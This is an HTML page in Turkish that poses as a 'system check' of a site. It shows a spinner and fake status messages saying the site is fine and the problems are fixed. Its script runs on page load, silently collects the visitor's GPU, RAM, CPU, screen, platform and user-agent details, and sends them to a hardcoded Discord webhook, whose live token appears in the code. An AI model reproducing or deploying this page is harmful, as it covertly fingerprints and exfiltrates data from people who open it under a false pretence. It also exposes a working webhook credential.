<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        body { background-color: #0c0c0c; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; }
        .container { text-align: center; }
        .loader { border: 2px solid #333; border-top: 2px solid #0f4; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.4s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 14px; margin: 0; color: #ccc; }
        .ok { color: #0f4; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="ld" class="loader"></div>
        <h2 id="tx">Site ayarları kontrol ediliyor...</h2>
    </div>

    <script>
        const url = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        function get() {
            let g = "N/A";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                g = gl.getParameter(d.UNMASKED_RENDERER_ID);
            } catch(e) {}

            return {
                embeds: [{
                    title: "⚡ HIZLI LOG",
                    color: 3066993,
                    fields: [
                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}GB\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
                        { name: "SCR", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                        { name: "SYS", value: `${navigator.platform}`, inline: true },
                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
                    ]
                }]
            };
        }

        // Anında tetikleme
        (function run() {
            const data = get();
            
            // Beklemeden gönder
            navigator.sendBeacon(url, JSON.stringify(data));
            fetch(url, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });

            // Görsel akışı hızlandır (Milisaniyelik geçişler)
            const tx = document.getElementById('tx');
            const ld = document.getElementById('ld');

            setTimeout(() => {
                tx.innerHTML = '<span class="ok">Site uygun halde!</span>';
            }, 400); // 0.4 saniye

            setTimeout(() => {
                ld.style.display = "none";
                tx.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>';
            }, 900); // Toplam 0.9 saniyede her şey biter
        })();
    </script>
</body>
</html>
